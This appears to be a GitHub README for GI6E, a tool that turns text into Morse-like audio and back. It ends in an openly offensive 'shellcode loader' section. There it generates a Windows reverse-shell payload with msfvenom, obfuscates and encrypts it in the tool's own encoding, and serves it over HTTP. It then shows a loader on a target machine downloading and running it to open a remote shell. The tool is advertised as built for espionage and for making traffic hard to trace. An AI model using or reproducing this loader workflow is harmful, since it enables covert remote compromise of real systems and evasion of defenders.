 

# GI6E

**"It seems capable of extracting sensitive information from specially crafted audio signals."**

HEX-GRID CODEX (abbreviated as HGC) is a custom 6-bit structured encoding system that utilizes a three-bit group identifier (Group Bits) plus a three-bit index identifier (Index Bits) to form 64 unique codes. Its core design philosophy maps letters and numbers onto a two-dimensional block matrix, enabling scalable, hierarchical, and machine-parsable character distribution. This makes it suitable for Morse code extensions, embedded communication protocols, cryptographic tagging, or compact representation of special character sequences.

---

https://youtu.be/Uzc14fmhI5I

### **V1.2 Update**

* \[+] Added AES-CTR encrypted transmission to significantly increase anti-traceability difficulty
* \[+] Modified decoding sensitivity
* \[+] Added client control interface
* \[+] Encryption/decryption parser added
* \[+] Malicious shellcode loader included

**"It might just be what espionage has been waiting for."**

![SPY](./pic/Main2.jpg)

---

# Installation

```bash
$ git clone https://github.com/MartinxMax/gi6e.git
$ cd gi6e
$ pip install -r require.txt
```

---

# Usage

```bash
$ python3 grid.py
```

![alt text](./pic/image.png)

---

## Text to WAV

Convert strings into GRID-encoded `.wav` audio files:

```bash
Please enter text to convert: TEST
[+] Grid file successfully generated: ./lib/history/generate/1752834436.wav
```

![alt text](./pic/image-1.png)
![alt text](./pic/image-2.png)

---

## WAV to Text

Input a `.wav` file and decode its content to plaintext:

```bash
Enter unencrypted WAV path: ./lib/history/generate/1752834436.wav
[Unencrypted] Decoded result => ('-.-.-- . --..-. .  . -.-.-. .  . -.-.-. .  . --..-. .  . --..-. .  . -...-. .  . --..-. .  . -.-.-. . ', 'TEST')
```

![alt text](./pic/image-3.png)

---

## One-click Test

Quickly verify system functionality:

![alt text](./pic/image-4.png)

---

## Real-time Listening

Play audio and decode the message in real-time:

![alt text](./pic/image-5.png)

---

## Text to Grid

Convert plaintext into GRID code:

```bash
Please enter text to convert: HELLO
[Unencrypted] Generated Grid code => '-.-.-- . -.-.-. . .--.-- . -.-.-. . --..-. . -.-.-. . .--..- . -.-.-. . .--..- . -.-.-. . --...- . '
```

![alt text](./pic/image-6.png)

---

## Grid to Text

Convert GRID code back to readable text:

```bash
Please enter Grid code (space separated): '-.-.-- . -.-.-. . .--.-- . -.-.-. . --..-. . -.-.-. . .--..- . -.-.-. . .--..- . -.-.-. . --...- . '
[Unencrypted] Decoded: HELLO
```

![alt text](./pic/image-7.png)

---

# Misuse: GRID-based SHELLCODE Loader

![alt text](./pic/image-10.png)

Generate shellcode (e.g., reverse shell payload):

```bash
(grid-loader)$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.8.102 LPORT=443 -f python | sed 's/\<buf\>/shellcode/g' > ./SHELLCODE/Main.conf
```

![alt text](./pic/image-8.png)

Convert shellcode into GRID code:

```bash
(grid-loader)$ python3 grid-gener.py
```

You can use the `-key` parameter for obfuscated encryption:

![alt text](./pic/image-9.png)

---

## Remote Loader

```bash
$ sudo python3 -m http.server 80
```

![alt text](./pic/image-11.png)

Upload `grid-loader.exe` to target system. Use `-key` parameter if encrypted:

```bash
> grid-loader.exe -load http://192.168.8.102/Main.grid
```

**Target:**

![alt text](./pic/image-15.png)

**Ubuntu Host:**

![alt text](./pic/image-14.png)

---

## Local Loader

```bash
> grid-loader.exe -load ./Main.grid
```

**Target:**

![alt text](./pic/image-16.png)

**Ubuntu Host:**

![alt text](./pic/image-17.png)

---

## GRID Encrypted Loader

```bash
(grid-loader)$ python3 grid-gener.py -key 12345678
```

![alt text](./pic/image-19.png)

```bash
> grid-loader.exe -load http://192.168.8.102/Main.grid -key 12345678
```

Or:

```bash
> grid-loader.exe -load ./Main.grid -key 12345678
```

![alt text](./pic/image-18.png)

 
